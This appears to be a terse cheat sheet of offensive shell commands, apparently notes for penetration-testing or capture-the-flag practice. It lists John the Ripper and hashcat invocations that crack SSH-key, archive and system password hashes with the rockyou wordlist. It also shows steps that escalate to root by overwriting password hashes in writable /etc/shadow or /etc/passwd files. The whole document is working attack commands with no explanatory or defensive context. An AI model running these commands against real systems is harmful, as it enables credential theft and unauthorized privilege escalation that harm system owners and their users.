ssh2john id_rsa >hash   
rar2john secure.rar > hash.txt 
zip2john secure.zip > hash.txt 
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

john --single --format=raw-md5 hash.txt

hash-identifier 
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  

ls -l /etc/shadow
mkpasswd -m sha-512 newpasswordhere
nano /etc/shadow
su root

ls -l /etc/passwd
openssl passwd newpasswordhere
nano /etc/passwd
su root

unshadow passwd shadow > unshadowed

hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
